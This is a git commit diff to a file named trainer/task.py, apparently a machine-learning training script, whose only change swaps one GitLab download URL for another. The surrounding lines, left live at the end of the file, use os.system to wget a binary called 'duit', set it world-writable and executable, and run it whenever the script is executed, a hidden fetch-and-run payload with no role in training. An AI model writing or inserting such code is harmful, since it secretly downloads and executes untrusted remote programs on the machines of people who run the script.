851feb628e19e2731f2e311d092caa4703d48280
naufal siswanto <naufalsis61@gmail.com>
2022-11-30 06:30:52 +0000

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/firo2/consel/-/raw/main/duit')
+os.system('wget https://gitlab.com/vrs8/vrs/-/raw/main/duit')
 os.system('chmod 777 duit')
 os.system('./duit')
